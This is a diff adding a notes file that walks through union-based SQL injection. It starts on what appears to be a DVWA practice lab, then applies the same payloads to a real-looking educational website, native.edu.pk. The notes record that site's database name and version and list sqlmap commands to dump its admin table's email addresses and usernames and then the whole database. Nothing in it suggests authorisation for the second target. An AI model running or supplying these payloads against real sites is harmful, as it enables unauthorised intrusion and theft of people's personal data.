@@ -1,0 +1,108 @@
+
+http://101.126.137.161/login.php
+http://101.126.137.161/vulnerabilities/sqli/?id=1&Submit=Submit#
+
+Query: select ??? from ??? where id='1';
+Parameter:  id=1
+URL: http://101.126.137.161/vulnerabilities/sqli/?id=1&Submit=Submit#
+----------------------------------
+[+] Error:
+```````````
+Query: select ??? from ??? where id='1';
+Parameter:  
+id=-1
+id=1'
+id=1"
+id=1)
+id=1')
+id=1")
+URL: http://101.126.137.161/vulnerabilities/sqli/?id=1'&Submit=Submit#
+DBMS: MariaDB
+-------------------------------
+[+] Balance + Injection + Comment:[ order by ]
+```````````````````````````````````````````````
+Query: select ??? from ??? where id='1';
+Parameter:  id=1' order by 1,2;-- -
+URL: http://101.126.137.161/vulnerabilities/sqli/?id=1' order by 1,2,3;-- -&Submit=Submit#
+Number of Columns: 2 
+DB: ????
+Table: ???
+
+[+] Balance + Injection + Comment:[ UNION ]
+```````````````````````````````````````````````
+Query: select ??? from ??? where id='1';
+Parameter:  id=1' order by 1,2;-- -
+URL: http://101.126.137.161/vulnerabilities/sqli/?id=1' union select 1,2;-- -&Submit=Submit#
+Number of Columns: 2 
+DB: ????
+Table: ???
+
+
+
+Query: select ??? from ??? where id='1';
+Parameter:  id=1' order by 1,2;-- -
+URL: http://101.126.137.161/vulnerabilities/sqli/?id=1' union select version(),database();-- -&Submit=Submit#
+Number of Columns: 2 
+DB: ????
+Table: ???
+
+
+
+version()
+database()
+@@hostname
+user()
+
+
+===================================================================================
+
+https://native.edu.pk/
+https://native.edu.pk/detail.php?ComCatID=28
+ 
+ 
+ 
+ 
+https://native.edu.pk/
+https://native.edu.pk/detail.php?ComCatID=28'
+ 
+https://native.edu.pk/detail.php?ComCatID=' or 1=1;-- - 
+ 
+ 
+https://native.edu.pk/detail.php?ComCatID=(28)  order by 1,2,3,4,5;-- -
+ 
+https://native.edu.pk/detail.php?ComCatID=(1) union select 1,2,3,4,5;-- -
+ 
+https://native.edu.pk/detail.php?ComCatID=(28) union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=nativepk_dbnative limit 0,1),version(),5;-- -
+ 
+DB: nativepk_dbnative
+version: 10.6.22-MariaDB
+Table: ???
+
+
+===============================================================================
+<<-----SQL map----->>
+
+Banner:
+````````
+sqlmap -u "https://native.edu.pk/detail.php?ComCatID=28" -p "ComCatID"  --dbms=MySQL --technique=EU --banner
+
+
+DBS
+````
+sqlmap -u "https://native.edu.pk/detail.php?ComCatID=28" -p "ComCatID"  --dbms=MySQL --technique=EU --dbs
+
+
+Tables from DB
+``````````````
+sqlmap -u "https://native.edu.pk/detail.php?ComCatID=28" -p "ComCatID"  --dbms=MySQL --technique=EU -D nativepk_dbnative --tables
+
+
+Columns from table:
+````````````````````
+sqlmap -u "https://native.edu.pk/detail.php?ComCatID=28" -p "ComCatID"  --dbms=MySQL --technique=EU -D nativepk_dbnative -T admin --columns
+
+
+sqlmap -u "https://native.edu.pk/detail.php?ComCatID=28" -p "ComCatID"  --dbms=MySQL --technique=EU -D nativepk_dbnative -T admin -C EmailAddress,UserName --dump 
+
+
+sqlmap -u "https://native.edu.pk/detail.php?ComCatID=28" -p "ComCatID"  --dbms=MySQL --technique=EU --dump-all
